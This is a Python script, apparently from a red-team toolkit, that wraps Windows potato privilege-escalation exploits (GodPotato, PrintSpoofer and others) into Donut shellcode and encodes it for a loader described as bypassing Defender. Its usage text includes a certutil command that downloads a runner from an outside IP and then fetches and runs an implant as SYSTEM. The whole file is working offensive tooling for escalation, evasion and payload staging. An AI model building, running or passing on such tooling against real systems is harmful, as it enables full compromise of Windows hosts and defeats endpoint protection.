#!/usr/bin/env python3
"""
Potato Privesc Shellcode Generator
Converts potato exploits (GodPotato, PrintSpoofer, etc.) to shellcode via Donut.
The shellcode is then loadable via runner.exe for Defender bypass.

Usage:
  gen_potato.py -p GodPotato -c "cmd /c whoami" -o /workspace/godpotato.enc
  gen_potato.py -p PrintSpoofer -c "cmd /c whoami" -o /workspace/printspoofer.enc
  gen_potato.py -p GodPotato -c "cmd /c certutil -urlcache -split -f http://10.99.0.16:8000/runner.exe %TEMP%\\r.exe && %TEMP%\\r.exe -remote http://10.99.0.16:8000/implant.enc"
"""

import argparse
import base64
import json
import os
import sys

# Potato binary locations (checked in order: local tools/, /opt/killshot, exegol, script_dir)
POTATO_PATHS = {
    "GodPotato": [
        "{script_dir}/tools/potatoes/GodPotato.exe",
        "/opt/killshot/tools/potatoes/GodPotato.exe",
        "/opt/my-resources/tools/potatoes/GodPotato.exe",
        "{script_dir}/GodPotato.exe",
    ],
    "PrintSpoofer": [
        "{script_dir}/tools/potatoes/PrintSpoofer.exe",
        "/opt/killshot/tools/potatoes/PrintSpoofer.exe",
        "/opt/my-resources/tools/potatoes/PrintSpoofer.exe",
        "{script_dir}/PrintSpoofer.exe",
    ],
    "BadPotato": [
        "{script_dir}/tools/potatoes/BadPotato.exe",
        "/opt/killshot/tools/potatoes/BadPotato.exe",
        "/opt/my-resources/tools/potatoes/BadPotato.exe",
        "/opt/tools/Kraken/net_assemblies/bin/BadPotato-mod/BadPotato_net48_x64.exe",
        "{script_dir}/BadPotato.exe",
    ],
    "EfsPotato": [
        "{script_dir}/tools/potatoes/EfsPotato.exe",
        "/opt/killshot/tools/potatoes/EfsPotato.exe",
        "/opt/my-resources/tools/potatoes/EfsPotato.exe",
        "/opt/tools/Kraken/net_assemblies/bin/EfsPotato-mod/EfsPotato_net40_x64.exe",
        "{script_dir}/EfsPotato.exe",
    ],
    "SweetPotato": [
        "{script_dir}/tools/potatoes/SweetPotato.exe",
        "/opt/killshot/tools/potatoes/SweetPotato.exe",
        "/opt/my-resources/tools/potatoes/SweetPotato.exe",
        "/opt/resources/windows/SweetPotato.exe",
        "{script_dir}/SweetPotato.exe",
    ],
}

# Default args for each potato
POTATO_ARGS = {
    "GodPotato": "-cmd \"{cmd}\"",
    "PrintSpoofer": "-c \"{cmd}\"",
    "BadPotato": "{cmd}",
    "EfsPotato": "{cmd}",
    "SweetPotato": "-a \"{cmd}\"",
}


def find_potato(name, script_dir):
    paths = POTATO_PATHS.get(name, [f"{script_dir}/{name}.exe"])
    for p in paths:
        p = p.format(script_dir=script_dir)
        if os.path.isfile(p):
            return p
    return None


def find_donut_python():
    for pypath in ["/opt/tools/Empire/venv/bin/python3", sys.executable]:
        if os.path.isfile(pypath):
            try:
                import subprocess
                result = subprocess.run(
                    [pypath, "-c", "import donut"],
                    capture_output=True, timeout=5
                )
                if result.returncode == 0:
                    return pypath
            except Exception:
                continue
    return None


def generate(potato_name, cmd, output_path, script_dir):
    potato_path = find_potato(potato_name, script_dir)
    if not potato_path:
        print(f"[!] {potato_name}.exe not found")
        return False

    print(f"[*] Potato: {potato_path}")
    print(f"[*] Command: {cmd}")

    # Build args string
    arg_template = POTATO_ARGS.get(potato_name, "-cmd \"{cmd}\"")
    args = arg_template.format(cmd=cmd)
    print(f"[*] Args: {args}")

    # Find donut
    donut_py = find_donut_python()
    if not donut_py:
        print("[!] Donut not found")
        return False

    import subprocess
    import tempfile

    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as tmp:
        tmp_path = tmp.name

    # Use donut to convert
    donut_code = f"""
import donut
sc = donut.create(file={json.dumps(potato_path)}, arch=2, params={json.dumps(args)}, exit_opt=2)
if sc:
    with open({json.dumps(tmp_path)}, 'wb') as f:
        f.write(sc)
    print(f'OK {{len(sc)}}')
else:
    print('FAIL')
"""

    result = subprocess.run(
        [donut_py, "-c", donut_code],
        capture_output=True, text=True, timeout=30
    )

    output = result.stdout.strip()
    if not output.startswith('OK'):
        print(f"[!] Donut failed: {result.stderr}")
        os.unlink(tmp_path)
        return False

    sc_size = output.split()[1]
    print(f"[+] Shellcode: {sc_size} bytes")

    # Base64 encode
    with open(tmp_path, 'rb') as f:
        sc_data = f.read()
    os.unlink(tmp_path)

    b64_data = base64.b64encode(sc_data)
    with open(output_path, 'wb') as f:
        f.write(b64_data)

    print(f"[+] Generated: {output_path} ({len(b64_data)} bytes)")
    return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Potato Privesc Shellcode Generator')
    parser.add_argument('-p', '--potato', required=True,
                        choices=list(POTATO_PATHS.keys()),
                        help='Potato exploit to use (GodPotato, PrintSpoofer, BadPotato, EfsPotato, SweetPotato)')
    parser.add_argument('-c', '--cmd', required=True,
                        help='Command to execute as SYSTEM')
    parser.add_argument('-o', '--output', required=True,
                        help='Output .enc file path')
    parser.add_argument('-s', '--script-dir', default='.',
                        help='Script directory (for finding binaries)')
    parser.add_argument('-l', '--list', action='store_true',
                        help='List available potatoes')
    args = parser.parse_args()

    if args.list:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        for name in POTATO_PATHS:
            path = find_potato(name, script_dir)
            status = f"found: {path}" if path else "NOT FOUND"
            print(f"  {name}: {status}")
        sys.exit(0)

    script_dir = args.script_dir or os.path.dirname(os.path.abspath(__file__))
    if not generate(args.potato, args.cmd, args.output, script_dir):
        sys.exit(1)
